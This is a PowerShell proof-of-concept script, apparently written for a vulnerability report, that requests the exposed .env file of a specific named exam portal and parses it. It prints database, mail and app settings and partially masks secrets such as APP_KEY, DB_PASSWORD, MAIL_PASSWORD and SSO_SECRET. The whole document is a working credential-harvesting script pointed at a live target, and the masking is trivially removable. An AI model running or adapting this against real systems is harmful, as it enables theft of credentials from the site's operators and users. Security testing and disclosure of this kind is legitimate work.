# PoC 01 — .env File Exposure (Masked Edition)
# Finding: CRITICAL | ID: ENV-01
# Target: https://student.citexams.in/.env
# Expected HTTP: 200 OK (should be 403 or 404)
# Run: powershell -ExecutionPolicy Bypass -File .\poc_01_env_exposure.ps1

Write-Host "=========================================="
Write-Host " PoC 01 — .env File Exposure" -ForegroundColor Cyan
Write-Host " Target: https://student.citexams.in/.env"
Write-Host "=========================================="
Write-Host ""

$uri = "https://student.citexams.in/.env"

try {
    $resp = Invoke-WebRequest -Uri $uri -UseBasicParsing -TimeoutSec 10

    Write-Host "[!] HTTP STATUS: $($resp.StatusCode) $($resp.StatusDescription)" -ForegroundColor Red
    Write-Host "[!] Content-Type: $($resp.Headers['Content-Type'])"
    Write-Host "[!] Size: $($resp.RawContentLength) bytes"
    Write-Host ""

    $content = $resp.Content
    if ($content -match "^\d{2,3} ") {
        $bytes = $content -split '\s+' | Where-Object {$_ -match '^\d+$'} | ForEach-Object { [byte]$_ }
        $text  = [System.Text.Encoding]::ASCII.GetString($bytes)
    } else {
        $text = $content
    }

    Write-Host "=== Extracted Configuration Keys (Masked) ===" -ForegroundColor Yellow
    $lines = $text -split "`n"
    foreach ($line in $lines) {
        if ($line -match "^(APP_NAME|APP_ENV|DB_CONNECTION|DB_HOST|DB_PORT|DB_DATABASE|DB_USERNAME|MAIL_HOST|MAIL_PORT|MAIL_USERNAME|MAIL_ENCRYPTION)=") {
            Write-Host "  $line"
        } elseif ($line -match "^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD|SSO_SECRET|CIT_CLIENT_KEY)=") {
            $parts = $line -split '=', 2
            $key = $parts[0]
            $val = $parts[1]
            $maskedVal = if ($val.Length -gt 8) { $val.Substring(0, 4) + "***" + $val.Substring($val.Length - 4) } else { "***" }
            Write-Host "  [EXPOSED SECRET] $key=$maskedVal" -ForegroundColor Red
        }
    }

    Write-Host ""
    Write-Host "[CONFIRMED] .env configuration file is publicly accessible." -ForegroundColor Red

} catch {
    $code = $_.Exception.Response.StatusCode.value__
    Write-Host "[SAFE] HTTP $code — .env is not accessible." -ForegroundColor Green
}
